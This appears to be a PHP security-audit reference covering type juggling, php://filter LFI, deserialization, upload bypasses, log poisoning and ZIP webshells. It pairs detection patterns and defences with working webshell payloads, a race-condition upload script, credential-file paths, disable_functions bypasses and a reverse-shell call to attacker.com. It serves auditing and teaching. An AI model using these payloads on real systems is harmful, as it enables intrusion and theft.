# PHP Language-Level Attack Patterns

Security issues arising from PHP's own type system, built-in functions, protocol handlers, etc.
This file focuses on **PHP language-level** unique security pitfalls, excluding framework-level topics (see `framework_patterns.md`) or general payloads (see `payload_templates.md`).

---

## Type Juggling Complete Reference Table

### `==` vs `===` Comparison Behavior Differences

PHP's `==` (loose comparison) performs implicit type conversion before comparison, which is the root cause of numerous authentication bypasses.

#### Loose Comparison Truth Table (all combinations below return `true` with `==`)

```
┌────────────────────────────────────────────────────────────────┐
│  Expression                      │  Result │  Reason                         │
├────────────────────────────────────────────────────────────────┤
│  0 == "any_string"               │  TRUE   │  string converted to int 0      │
│  0 == ""                         │  TRUE   │  empty string converted to 0    │
│  0 == null                       │  TRUE   │  null converted to 0            │
│  0 == false                      │  TRUE   │  false converted to 0           │
│  "" == null                      │  TRUE   │  both treated as empty          │
│  "" == false                     │  TRUE   │  empty string is falsy          │
│  null == false                   │  TRUE   │  both are empty types           │
│  "0" == false                    │  TRUE   │  "0" is falsy                   │
│  "0" == null                     │  FALSE  │  note: this one is false        │
│  "0e123" == "0e456"              │  TRUE   │  both parsed as scientific 0    │
│  "0e123" == 0                    │  TRUE   │  scientific notation value is 0 │
│  "1" == "01"                     │  TRUE   │  numeric string comparison      │
│  "1" == "1.0"                    │  TRUE   │  numeric string comparison      │
│  "123" == 123                    │  TRUE   │  string converted to int        │
│  1 == "1abc"                     │  TRUE   │  "1abc" converted to 1          │
│  true == "any_nonzero_string"    │  TRUE   │  non-empty string is true       │
│  true == 1                       │  TRUE   │  1 converted to true            │
│  true == -1                      │  TRUE   │  non-zero converted to true     │
│  true == [1]                     │  TRUE   │  non-empty array is true        │
│  INF == INF                      │  TRUE   │  infinity equals infinity       │
│  "php" == 0                      │  TRUE   │  "php" converted to 0           │
│  "1e1" == "10"                   │  TRUE   │  1e1 = 10                       │
└────────────────────────────────────────────────────────────────┘
```

> **PHP 8.0 Behavior Change**: `0 == "string"` returns `FALSE` in PHP 8.0+ (non-numeric strings are no longer converted to 0).
> However, `"0e123" == "0e456"` is still `TRUE` (both are valid numeric strings).

#### How It Works

PHP loose comparison (`==`) follows complex type conversion rules: when the two sides have different types, PHP attempts to convert them to a common type. When comparing a string with an integer, the string is converted via `intval()`; when comparing two numeric-looking strings, they are compared by numeric value.

#### Detection Method

```
Search for the following patterns in the code:
- if ($user_input == $secret)
- if ($token == $stored_token)
- if ($password == $hash)
- switch($input) { case "admin": ... } (switch uses loose comparison)
```

#### Payload Examples

```php
// Scenario: authentication bypass
// Code: if ($_GET['password'] == $admin_password)
// When $admin_password = "0e123456789" (hash starting with 0e)
// Attack: ?password=0  → 0 == "0e123456789" → 0 == 0.0 → TRUE

// Scenario: JSON type bypass
// Code: if ($_POST['pin'] == "0000")
// Attack: Content-Type: application/json → {"pin": 0}
// 0 == "0000" → TRUE (int 0 vs string)
```

#### Key Insight Summary

> All comparisons involving passwords, tokens, and verification codes **MUST use `===`**. JSON input is especially dangerous because `json_decode` preserves the integer type, directly bypassing string comparison.

---

### Magic Hash List

The following plaintexts produce `0e[0-9]+` format results after MD5/SHA1 hashing, all equal to `0` in loose comparison:

#### MD5 Magic Hash

```
┌──────────────────┬──────────────────────────────────────┐
│  Plaintext        │  MD5 Hash Value                      │
├──────────────────┼──────────────────────────────────────┤
│  240610708       │  0e462097431906509019562988736854     │
│  QNKCDZO        │  0e830400451993494058024219903391     │
│  aabg7XSs       │  0e087386482136013740957780965295     │
│  aabC9RqS       │  0e041022518165728065344349536617     │
│  s878926199a     │  0e545993274517709034328855841020     │
│  s155964671a     │  0e342768416822451524974117254469     │
│  s214587387a     │  0e848240448830537924465865611904     │
│  s1091221200a    │  0e940624217856561557816327384675     │
│  byGcY           │  0e591948146966052067035298880982     │
└──────────────────┴──────────────────────────────────────┘
```

#### SHA1 Magic Hash

```
┌──────────────────┬──────────────────────────────────────────────┐
│  Plaintext        │  SHA1 Hash Value                             │
├──────────────────┼──────────────────────────────────────────────┤
│  aaroZmOk       │  0e66507019969427134894567494305185566735     │
│  aaK1STfY       │  0e76658526655756207688271159624026011393     │
│  aaO8zKZF       │  0e89257456677279068558073954252716165668     │
│  aa3OFF9m       │  0e36977786278517984959260394024281014729     │
└──────────────────┴──────────────────────────────────────────────┘
```

#### How It Works

When `md5($input)` returns a string in the `0e[0-9]+` format, PHP interprets it as scientific notation `0 * 10^N = 0`. Two such hash values will always be equal in loose comparison.

#### Detection Method

```
Search pattern: if (md5($input) == md5($stored))
Search pattern: if (sha1($input) == $hash)
Search pattern: if (hash('md5', $x) == hash('md5', $y))
```

#### Payload Examples

```php
// Code: if (md5($_GET['pass']) == $stored_md5_hash)
// If $stored_md5_hash happens to start with 0e followed by only digits
// Attack: ?pass=240610708 → md5("240610708") = "0e462..." == "0e..." → TRUE
// Or: ?pass=QNKCDZO
```

#### Key Insight Summary

> Magic Hash attacks require that the stored hash also starts with `0e`. In real-world scenarios, this is often combined with registration functionality — register a user with password `240610708`, then use another magic hash to log into other users' accounts.

---

### strcmp() / in_array() / switch Type Confusion

#### strcmp() Array Bypass

```php
// Vulnerable code
if (!strcmp($_POST['password'], $secret)) {
    // Authentication passed
}

// How it works: strcmp(array, string) returns NULL (and triggers a Warning)
// !NULL === true → authentication bypass
// Attack: POST password[]=anything
```

#### How It Works

`strcmp()` returns `NULL` instead of `0` or a non-zero integer when receiving a non-string argument. `!NULL` evaluates to `true` in PHP, which behaves identically to `!0` (the return value on successful match).

#### Detection Method

```
Search pattern: if (!strcmp($input, $secret))
Search pattern: if (strcmp($x, $y) == 0)   ← loose comparison NULL == 0 is also TRUE
Safe pattern:   if (strcmp($x, $y) === 0)   ← strict comparison
```

#### in_array() Loose Comparison Bypass

```php
// Vulnerable code
$whitelist = [1, 2, 3, 4, 5];
if (in_array($_GET['page'], $whitelist)) {
    include $_GET['page'];  // Dangerous!
}

// How it works: in_array() uses loose comparison by default
// in_array("1exploit.php", [1,2,3]) → TRUE (because "1exploit.php" == 1)
// Attack: ?page=1exploit.php → bypasses whitelist and includes arbitrary file
```

#### Detection Method

```
Search for: in_array($var, $array) ← missing the third parameter true
Safe pattern: in_array($var, $array, true)  ← strict mode
```

#### switch-case Loose Comparison

```php
// Vulnerable code
switch ($_GET['action']) {
    case 0:
        admin_panel();  // admin panel
        break;
    case 1:
        user_panel();
        break;
}

// How it works: switch uses == loose comparison
// "anything" == 0 → TRUE → any string matches case 0
// Attack: ?action=anything → enters admin_panel()
```

#### Key Insight Summary

> `strcmp()` returns NULL when passed an array; `in_array()` uses loose comparison by default; `switch` always uses loose comparison. All three are common PHP authentication/authorization bypass vectors.

---

## php://filter Chain Complete Reference

### Basic Usage: Source Code Disclosure

#### How It Works

`php://filter` is a PHP stream wrapper that allows applying filters to data before reading a resource. `convert.base64-encode` Base64-encodes the PHP file content before output, preventing it from being executed as PHP.

#### Detection Method

```
Search for include/require with LFI:
- include($_GET['file']);
- include($page . '.php');
- require_once($template);
- file_get_contents($user_input);
```

#### Payload Examples

```
# Basic source code reading
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/convert.base64-encode/resource=index

# Multiple filter chaining
php://filter/string.rot13/resource=config.php
php://filter/convert.base64-encode|convert.base64-encode/resource=config.php

# Write scenario (if file_put_contents + filter exists)
php://filter/convert.base64-decode/resource=shell.php
# Base64-encode the webshell first, it will be automatically decoded on write
```

### Advanced Usage: iconv Filter Chain for Arbitrary Content Construction

#### How It Works

PHP 7+'s `convert.iconv` filter can introduce specific bytes during character encoding conversion. By carefully orchestrating multiple iconv conversion chains, arbitrary strings (e.g., `<?php system($_GET[0]);?>`) can be constructed from empty content. This enables RCE through LFI even when the target file does not exist or is empty.

#### Detection Method

```
As long as LFI exists (controllable include/require), iconv chain exploitation is possible.
Tool: https://github.com/synacktiv/php_filter_chain_generator
```

#### Payload Examples

```
# Using the tool to generate (generates a filter chain for <?php system('id');?>)
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'

# Output format (extremely long filter chain):
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|...(hundreds of conversions omitted)...|
convert.base64-decode/resource=php://temp
```

#### Key Insight Summary

> php://filter is the Swiss Army knife of LFI. Basic usage discloses source code; advanced iconv chains can achieve fileless RCE. During auditing, any controllable `include` parameter SHOULD be flagged as high severity.

---

### Common LFI Target Path List

```
# Linux System Files
/etc/passwd
/etc/shadow                          # requires root privileges
/etc/hosts
/proc/self/environ                   # environment variables, contains User-Agent (can be poisoned)
/proc/self/cmdline                   # process command line
/proc/self/fd/[0-9]                  # open file descriptors
/proc/self/status                    # process information

# Web Server Logs (Log Poisoning targets)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log            # CentOS/RHEL

# PHP Configuration & Sessions
/etc/php.ini
/etc/php/7.4/fpm/php.ini
/tmp/sess_<PHPSESSID>                # PHP Session files
/var/lib/php/sessions/sess_<ID>      # Debian/Ubuntu session path

# Application Configuration Files
.env                                 # Laravel/general environment config
config.php
wp-config.php                        # WordPress
configuration.php                    # Joomla
settings.php                         # Drupal
```

### Null Byte Truncation (PHP < 5.3.4)

#### How It Works

Before PHP 5.3.4, the underlying C functions used `\0` (null byte) as the string terminator. Attackers could inject `%00` into file paths to truncate the suffix.

#### Payload Examples

```php
// Code: include($_GET['page'] . '.php');
// Attack (PHP < 5.3.4): ?page=../../../etc/passwd%00
// Effect: include("../../../etc/passwd\0.php") → actually reads /etc/passwd

// Code: include($_GET['lang'] . '/header.tpl');
// Attack: ?lang=php://filter/convert.base64-encode/resource=config.php%00
```

#### Key Insight Summary

> Null byte truncation only works on PHP < 5.3.4; modern PHP has fixed this. However, legacy systems still widely exist, and auditors MUST verify the PHP version.

---

## PHP Deserialization Cookie/Session Patterns

### Standard Serialization Format Reference

```
Type markers:
  b:1;                              → boolean true
  i:42;                             → integer 42
  d:3.14;                           → double 3.14
  s:5:"hello";                      → string "hello" (length: 5)
  a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}  → array ["foo", "bar"]
  O:8:"ClassName":1:{s:4:"prop";s:5:"value";}  → object

Property visibility encoding:
  s:4:"name"          → public $name
  s:14:"\0ClassName\0name"  → private $name (\0 is null byte)
  s:7:"\0*\0name"     → protected $name
```

#### How It Works

PHP's `unserialize()` automatically invokes an object's magic methods (`__wakeup`, `__destruct`, `__toString`, etc.). Attackers craft malicious serialized data that leverages existing classes' magic method chains (POP chains) to achieve arbitrary code execution.

#### Detection Method

```
Directly dangerous functions:
- unserialize($_GET/POST/COOKIE/REQUEST[...])
- unserialize(base64_decode($input))
- unserialize(gzuncompress($input))

Indirect triggers:
- phar:// protocol trigger (see below)
- session.serialize_handler inconsistency
```

#### Payload Examples

```php
// Basic POC
O:8:"FilePath":1:{s:4:"path";s:11:"/etc/passwd";}

// __wakeup bypass (CVE-2016-7124, PHP 5 < 5.6.25, PHP 7 < 7.0.10)
// How it works: declared property count > actual property count → __wakeup is not called
// Original: O:4:"Test":1:{s:4:"data";s:4:"safe";}
// Bypass:   O:4:"Test":2:{s:4:"data";s:7:"exploit";}  ← property count changed to 2
```

### Phar Deserialization Trigger

#### How It Works

The metadata section of Phar (PHP Archive) files is stored in PHP serialization format. Any function performing file operations on a `phar://` path will automatically deserialize the metadata, without an explicit `unserialize()` call.

#### Functions That Can Trigger Phar Deserialization

```
File info:        file_exists(), is_file(), is_dir(), is_link(), is_writable()
                  file(), fileatime(), filectime(), filemtime(), filesize()
                  filegroup(), fileinode(), fileowner(), fileperms(), filetype()
File operations:  fopen(), copy(), rename(), unlink(), stat(), lstat()
                  readfile(), file_get_contents(), file_put_contents()
Directory ops:    opendir(), scandir(), glob()
Image processing: getimagesize(), exif_read_data()
Hash computation: md5_file(), sha1_file(), hash_file()
Config parsing:   parse_ini_file()
```

#### Payload Examples

```php
// Step 1: Generate malicious Phar file
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$exploit = new VulnerableClass();
$exploit->cmd = 'id';
$phar->setMetadata($exploit);
$phar->stopBuffering();

// Step 2: Rename evil.phar to evil.jpg for upload (bypass extension check)
// Step 3: Trigger deserialization
// file_exists('phar://uploads/evil.jpg/test.txt') → triggers unserialize(metadata)
```

### Common POP Chain Patterns

```
┌─────────────┬──────────────────────────────────────────────────────┐
│  Framework   │  POP Chain Entry Point                               │
├─────────────┼──────────────────────────────────────────────────────┤
│  Laravel     │  PendingBroadcast → __destruct → Dispatcher         │
│             │  → dispatch() → call_user_func()                    │
│             │  Tool: phpggc Laravel/RCE1~RCE10                     │
├─────────────┼──────────────────────────────────────────────────────┤
│  Symfony     │  Process → __destruct → executes proc_open()        │
│             │  Tool: phpggc Symfony/RCE1~RCE4                      │
├─────────────┼──────────────────────────────────────────────────────┤
│  Yii2        │  BatchQueryResult → __destruct → close()            │
│             │  → DataReader → close() → call_user_func()          │
├─────────────┼──────────────────────────────────────────────────────┤
│  ThinkPHP    │  Windows → __destruct → removeFiles()               │
│             │  → file_exists() → Phar secondary deserialization    │
│             │  Tool: phpggc ThinkPHP/RCE1~RCE2                     │
├─────────────┼──────────────────────────────────────────────────────┤
│  Monolog     │  BufferHandler → __destruct → close()               │
│             │  → handle() → StreamHandler → write()               │
│             │  → file_put_contents() writes webshell               │
├─────────────┼──────────────────────────────────────────────────────┤
│  Guzzle      │  FileCookieJar → __destruct → save()                │
│             │  → file_put_contents() writes webshell               │
└─────────────┴──────────────────────────────────────────────────────┘

# General POP Chain generation tool
phpggc <Framework/Type> <payload>
# Example: phpggc Laravel/RCE6 'system' 'id'
```

#### Key Insight Summary

> PHP deserialization is not limited to `unserialize()` calls. The Phar protocol makes any file operation function a potential deserialization entry point. During auditing, search for all controllable file path parameters + reachability of the phar:// protocol.

---

## basename() / Path Handling Function Pitfalls

### basename() Risks

#### How It Works

`basename()` extracts the last component of a path, but it **does not filter** hidden files (starting with `.`) or backup files (ending with `~`). More importantly, `basename()` can produce unexpected truncation on certain multi-byte characters.

#### Detection Method

```
Search for: basename($path) used in security checks
Search for: relying solely on basename() for filename whitelist validation
```

#### Payload Examples

```php
// Scenario: only allow accessing files in a specific directory
$file = basename($_GET['file']);
include("/safe/dir/" . $file);

// Attack 1: ?file=.htaccess → reads .htaccess configuration
// Attack 2: ?file=config.php.bak → reads backup file (may contain plaintext passwords)

// basename() multi-byte truncation (locale-dependent)
setlocale(LC_ALL, "C");  // ASCII locale
basename("/path/to/\xff/etc/passwd");
// May return unexpected results under certain locales
```

### realpath() Empty Return Handling

#### How It Works

`realpath()` returns `false` when the file does not exist. If the code does not check the return value, it may lead to path validation bypass.

#### Payload Examples

```php
// Vulnerable code
$path = realpath($_GET['file']);
if (strpos($path, '/safe/dir/') === 0) {
    readfile($path);
}

// Attack: when the file does not exist, realpath() returns false
// strpos(false, '/safe/dir/') === false
// false === 0 → FALSE → but if == is used instead of ===
// strpos(false, ...) == 0 → note the strpos return value comparison pitfall
```

### pathinfo() Extension Bypass

#### How It Works

`pathinfo()` takes the content after the last `.` as the extension. Double extensions and special characters can bypass extension checks based on `pathinfo()`.

#### Payload Examples

```php
// Code: $ext = pathinfo($filename, PATHINFO_EXTENSION);
// if ($ext !== 'php') { /* allow upload */ }

pathinfo('shell.php.jpg', PATHINFO_EXTENSION);   // → "jpg" (bypasses check)
// But Apache may parse it as .php (double extension parsing vulnerability)

pathinfo('shell.PHP', PATHINFO_EXTENSION);        // → "PHP"
// Can bypass blacklist when matching is case-insensitive

pathinfo('shell.php.', PATHINFO_EXTENSION);       // → "" (empty string)
// On Windows, trailing . in filenames is automatically removed → actually stored as shell.php

pathinfo('.htaccess', PATHINFO_EXTENSION);        // → "htaccess"
// PATHINFO_FILENAME returns "" → may bypass non-empty filename checks
```

#### Key Insight Summary

> Path handling functions each have their edge cases. During security auditing, you SHOULD NOT rely on a single function for path security validation. It is RECOMMENDED to combine `realpath()` + directory prefix checking + extension whitelist + `===` strict comparison.

---

## PHP-Specific File Upload Bypass

### .htaccess Upload RCE

#### How It Works

If a `.htaccess` file can be uploaded to a directory parseable by the Apache server, file parsing rules can be redefined to make any extension execute as PHP.

#### Detection Method

```
Conditions:
1. Apache + mod_php or Apache + php-fpm (with AllowOverride enabled)
2. Upload directory is web-accessible
3. .htaccess file upload is not restricted
```

#### Payload Examples

```apache
# .htaccess content option 1: custom extension
AddType application/x-httpd-php .xxx
# Then upload shell.xxx with content <?php system($_GET['cmd']); ?>

# .htaccess content option 2: parse all files as PHP
SetHandler application/x-httpd-php
# Then upload webshell with any filename

# .htaccess content option 3: auto prepend
php_value auto_prepend_file "uploads/shell.jpg"
# Makes every PHP request include shell.jpg first

# .htaccess content option 4: enable PHP short tags
php_flag short_open_tag On
# Then upload a file containing <?= system('id'); ?>
```

### Extension Bypass List

```
Extensions that can be parsed as PHP (depends on server configuration):
  .php    - standard
  .phtml  - common alternative
  .php3   - PHP 3 legacy
  .php4   - PHP 4 legacy
  .php5   - PHP 5 specific
  .php7   - PHP 7 specific
  .phar   - PHP Archive
  .phps   - PHP source display (executable under some configurations)
  .pht    - supported on some systems
  .pgif   - very rare but exists

Case variants:
  .pHp, .PhP, .PHP, .pHP etc. (Windows / some Linux configurations)

Double extension exploitation (Apache configuration flaw):
  shell.php.jpg    → parsed as .php under certain Apache configurations
  shell.php.xxxxx  → unknown extension falls back to the previous one
```

### getimagesize() Bypass (Image Webshell)

#### How It Works

`getimagesize()` only validates the image magic bytes in the file header and does not check the rest of the file content. Attackers can append PHP code after a valid image header.

#### Payload Examples

```bash
# Method 1: GIF header + PHP code
echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Method 2: Embed PHP in the EXIF comment of a real JPEG
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg

# Method 3: Embed PHP in PNG IDAT chunk
# Tool: https://github.com/huntergregal/PNG-IDAT-Payload-Generator

# Method 4: Embed in BMP file color table data
# First 14 bytes are BMP header, PHP code can be injected afterward
```

### move_uploaded_file() Race Condition

#### How It Works

In the "upload → check → delete/move" flow, there is a time window between the file's temporary location and final location. Attackers can exploit the race condition to access the malicious file before the check is completed.

#### Payload Examples

```python
# Race condition exploitation concept
# Thread A: continuously upload webshell
# Thread B: continuously request webshell URL
# Window: after move_uploaded_file() moves file to target directory, before security check deletes it

import threading
import requests

def upload():
    while True:
        requests.post(url, files={'file': ('shell.php', '<?php system("id");?>')})

def access():
    while True:
        r = requests.get(target_url + '/uploads/shell.php')
        if 'uid=' in r.text:
            print("[+] RCE Success:", r.text)
            break
```

#### Key Insight Summary

> File upload defense requires multiple layers: extension whitelist + MIME check + file content check + randomized filenames + disable PHP execution in upload directory + block .htaccess uploads.

---

## Log Poisoning RCE Patterns

### User-Agent Injection + LFI

#### How It Works

Web servers write HTTP request headers (User-Agent, Referer, etc.) to access logs. If an LFI vulnerability exists that can include the log file, attackers can achieve RCE by injecting PHP code into request headers.

#### Detection Method

```
Conditions:
1. LFI vulnerability exists (controllable include/require parameter)
2. PHP process has permission to read web server logs
3. Log path is predictable
```

#### Payload Examples

```
# Step 1: Inject PHP code into the log
curl -A '<?php system($_GET["cmd"]); ?>' http://target/any-page

# Step 2: Include the log file via LFI
http://target/vuln.php?page=/var/log/apache2/access.log&cmd=id
http://target/vuln.php?page=/var/log/nginx/access.log&cmd=id

# Note: if injection fails (log is truncated), try a short payload
curl -A '<?=`$_GET[1]`?>' http://target/
# Short tag + backtick execution, only 19 characters
```

### /proc/self/environ Injection

#### How It Works

`/proc/self/environ` contains the current process's environment variables, including `HTTP_USER_AGENT` and others from the HTTP request. Under CGI/FastCGI mode, this file can be directly included to achieve RCE.

#### Payload Examples

```
# Step 1: Set User-Agent to PHP code
# Step 2: LFI include /proc/self/environ
http://target/vuln.php?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

### PHP Session File Injection

#### How It Works

PHP stores session data in the filesystem (default `/tmp/sess_<PHPSESSID>` or `/var/lib/php/sessions/sess_<ID>`). If the application stores user input in sessions, attackers can inject PHP code into the session file and then execute it through LFI inclusion.

#### Payload Examples

```php
// Step 1: Application stores username in session
// $_SESSION['username'] = $_POST['username'];

// Step 2: Register with a username containing PHP code
// POST username=<?php system('id'); ?>

// Step 3: LFI include the session file
// http://target/vuln.php?page=/tmp/sess_abc123def456
// where abc123def456 is the PHPSESSID cookie value

// Session file content example:
// username|s:26:"<?php system('id'); ?>";
```

#### Key Insight Summary

> Log Poisoning is the classic path for escalating LFI to RCE. Defense essentials: fixing LFI is fundamental; log directory permission isolation is defense in depth.

---

## ZIP Upload Webshell Patterns

### ZIP Extraction Webshell Implantation

#### How It Works

If an application accepts ZIP uploads and extracts them to a web-accessible directory, attackers can place a PHP webshell inside the ZIP. Even if the application checks that the uploaded file extension is `.zip`, the extracted contents may include `.php` files.

#### Detection Method

```
Search for: ZipArchive::extractTo()
Search for: zip_open() + zip_read()
Search for: shell_exec('unzip ...')
Verify: whether the extraction target directory is web-accessible + whether internal filenames are checked
```

#### Payload Examples

```bash
# Create a ZIP containing a webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip evil.zip shell.php
# Upload evil.zip → after extraction, shell.php appears in the web directory

# ZIP with path traversal (ZipSlip)
python3 -c "
import zipfile
z = zipfile.ZipFile('zipslip.zip', 'w')
z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
z.close()
"
# During extraction, the file may be written to a parent directory
```

### Alternatives When system() Is Disabled

#### How It Works

The `disable_functions` configuration can disable dangerous functions. However, PHP has numerous alternative functions that can read files or execute code.

#### Payload Examples

```php
// When system/exec/shell_exec/passthru/popen are disabled:

// File reading alternatives
echo file_get_contents('/etc/passwd');
readfile('/flag.txt');
show_source('/flag.txt');         // equivalent to highlight_file()
print_r(file('/etc/passwd'));     // reads into array by line
$f = fopen('/etc/passwd','r'); echo fread($f, filesize('/etc/passwd'));

// Command execution alternatives
$proc = proc_open('id', [1=>['pipe','w']], $pipes); echo stream_get_contents($pipes[1]);
echo `id`;                        // backticks (essentially shell_exec)
pcntl_exec('/bin/sh', ['-c', 'id']);  // requires pcntl extension
$sock = fsockopen('attacker.com', 4444); // reverse shell

// mail() function exploitation (writing log via -X parameter)
mail('','','','','-OQueueDirectory=/tmp -X/var/www/html/shell.php');

// putenv() + mail() LD_PRELOAD hijacking
putenv('LD_PRELOAD=/tmp/evil.so');
mail('','','','');  // triggers sendmail → loads evil.so

// FFI (PHP 7.4+, must be enabled)
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id");

// imap_open() exploitation (requires imap extension)
imap_open('{attacker.com:993/imap/ssl}INBOX', '', '', 0, 1, [
    'DISABLE_AUTHENTICATOR' => 'GSSAPI'
]);
// Certain versions allow command injection via the mailbox parameter
```

### Symlink in ZIP (ZipSlip Variant)

#### How It Works

ZIP files can contain symbolic links. If symlinks are not checked during extraction, attackers can create symbolic links pointing to sensitive files and then read them via web access.

#### Payload Examples

```bash
# Create a ZIP containing a symbolic link
ln -s /etc/passwd passwd_link
zip --symlinks evil.zip passwd_link
# After upload and extraction, accessing passwd_link reads /etc/passwd

# Two-step attack (bypasses more checks)
# Step 1: Upload ZIP containing a symlink pointing to /
ln -s / root_link
zip --symlinks step1.zip root_link

# Step 2: Upload ZIP containing path root_link/etc/passwd
# After extraction, reads arbitrary files via the symlink
```

#### Key Insight Summary

> ZIP upload is an underestimated attack surface. Defense requires: checking internal filenames before extraction (MUST prohibit `..`), prohibiting symlinks, restricting the extraction target directory, and scanning file extensions after extraction. `disable_functions` is not a silver bullet — PHP's alternative execution/reading methods are extremely abundant.

---

## Appendix: Audit Checklist Quick Reference

```
□ Are all comparison operations using === instead of ==
□ Does in_array() pass true as the third parameter
□ Is strcmp() return value checked with === 0
□ Are include/require paths controllable
□ Does unserialize() accept external input
□ Can file operation functions potentially accept the phar:// protocol
□ Does upload functionality check for .htaccess and double extensions
□ Does ZIP extraction validate internal file paths and types
□ Is the disable_functions list comprehensive (are alternative functions missed)
□ Can session / log paths be included via LFI
□ Is basename() / pathinfo() used as the sole security check
□ Is realpath() returning false handled correctly
```
